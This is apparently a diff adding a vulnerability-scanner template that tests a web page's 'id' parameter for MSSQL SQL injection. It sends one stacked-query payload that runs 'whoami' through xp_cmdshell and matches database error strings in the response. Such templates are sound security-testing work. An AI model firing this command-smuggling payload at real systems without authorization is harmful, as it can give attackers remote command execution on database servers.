@@ -1,0 +1,23 @@
+id: patt-sqli-mssql-xp-01-id
+name: 'PATT sqli patt-sqli-mssql-xp-01 via id'
+severity: critical
+type: active
+tags:
+  - sqli
+  - patt
+requires:
+  - dotnet
+description: 'PATT MSSQL stacked xp_cmdshell (RCE path, verifikasi manual). [patt:patt-sqli-mssql-xp-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/MSSQL%20Injection.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      id:
+        - '''; EXEC xp_cmdshell(''whoami'')-- -'
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'ODBC'
+          - 'SQL Server'
+          - 'xp_cmdshell'
